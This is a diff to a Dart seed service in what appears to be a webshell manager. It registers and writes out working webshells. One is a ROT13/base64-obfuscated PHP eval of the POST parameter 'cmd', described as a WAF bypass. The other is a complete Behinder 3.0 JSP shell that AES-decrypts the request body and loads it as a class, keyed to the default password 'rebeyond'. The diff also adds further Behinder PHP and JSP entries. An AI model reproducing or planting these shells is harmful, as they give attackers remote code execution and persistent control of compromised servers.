@@ -6,7 +6,7 @@ import '../database/database_helper.dart';
 /// 版本号递增时自动补充新增的默认条目
 class SeedService {
   static const _kMetaKey = 'seed_version';
-  static const _kCurrentVersion = 4;
+  static const _kCurrentVersion = 6;
 
   // ── Payload 分类 ─────────────────────────────────────────────────────────
   // 命名规则：{语言}_{技术}_{传参方式}
@@ -49,8 +49,16 @@ class SeedService {
       asset: 'assets/defaults/payloads/php_b64rot13_post.php',
       name: 'php_b64rot13_post.php',
       type: 'php',
-      description: 'ROT13 + Base64 双重编码绕过 WAF，POST 参数 x',
+      description: 'ROT13 + Base64 双重编码绕过 WAF，POST 参数 cmd',
       tags: 'php,bypass,base64,rot13,waf',
+    ),
+    _PayloadDef(
+      asset: 'assets/defaults/payloads/bing.php',
+      name: 'bing.php',
+      type: 'php',
+      description: '冰蝎 3.0 原版 PHP，AES 加密，func|params 格式，默认密码 rebeyond',
+      tags: 'php,behinder,aes,encrypt,冰蝎',
+      sinceVersion: 6,
     ),
     // ── JSP ──────────────────────────────────────────────────────────────
     _PayloadDef(
@@ -66,6 +74,22 @@ class SeedService {
       type: 'jsp',
       description: 'JSP ClassLoader 动态加载字节码（冰蝎风格），GET 参数 cmd 传 Base64 类文件',
       tags: 'jsp,classloader,bytecode,base64,behinder',
+    ),
+    _PayloadDef(
+      asset: 'assets/defaults/payloads/jsp_behinder.jsp',
+      name: 'jsp_behinder.jsp',
+      type: 'jsp',
+      description: '冰蝎 3.0 协议（_bp 缓存参数），AES 加密，默认密码 rebeyond',
+      tags: 'jsp,behinder,aes,encrypt,冰蝎',
+      sinceVersion: 5,
+    ),
+    _PayloadDef(
+      asset: 'assets/defaults/payloads/bing.jsp',
+      name: 'bing.jsp',
+      type: 'jsp',
+      description: '冰蝎 3.0 原版 JSP，AES 加密，payload 只读 body 第一行，agent 读第二行取参',
+      tags: 'jsp,behinder,aes,encrypt,冰蝎',
+      sinceVersion: 6,
     ),
     // ── ASP ──────────────────────────────────────────────────────────────
     _PayloadDef(
@@ -102,9 +126,15 @@ class SeedService {
       newName: 'php_b64rot13_post.php',
       content: '<?php\n'
           r"$f = str_rot13('onfr64_qrpbqr');" '\n'
-          r"$q = $f($_POST['x']);" '\n'
+          r"$q = $f($_POST['cmd']);" '\n'
           '@eval(\$q);\n'
           '?>\n',
+    ),
+    // jsp_behinder：getReader() 后 getParameter() 为 null，需在读取 body 前缓存参数
+    _PayloadPatch(
+      names: ['jsp_behinder.jsp'],
+      newName: 'jsp_behinder.jsp',
+      content: '<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);java.util.Map<String,String> _m=new java.util.HashMap<>();java.util.Enumeration<?> _e=request.getParameterNames();while(_e.hasMoreElements()){String _n=(String)_e.nextElement();_m.put(_n,request.getParameter(_n));}request.setAttribute("_bp",_m);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>',
     ),
   ];
 
